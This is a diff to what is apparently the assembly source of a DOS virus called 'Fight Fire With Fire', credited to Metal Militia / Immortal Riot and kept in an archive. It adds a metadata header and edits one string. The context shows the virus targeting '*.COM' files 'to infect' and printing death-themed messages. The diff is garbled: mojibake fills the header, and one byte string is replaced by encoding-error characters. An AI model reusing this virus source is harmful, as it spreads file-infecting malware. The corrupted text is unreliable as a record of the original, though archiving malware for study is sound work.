@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; VirusName: Fight Fire With Fire
 ; Country  : Sweden
 ; Author   : Metal Militia / Immortal Riot
@@ -245,7 +256,7 @@ father          db      0
 filename        db      '*.COM',0 ; File(s) to infect
                 db      'Soon to fill our lungs the hot winds of death '
                 db      'The gods are laughing, so take your last breath '
-                db      'é]`x  ·  u  … '
+                db      'ï¿½]`x  ï¿½  u  ï¿½ '
                 db      'Immortal Riot..Death Greets me warm..'
  
 quit:
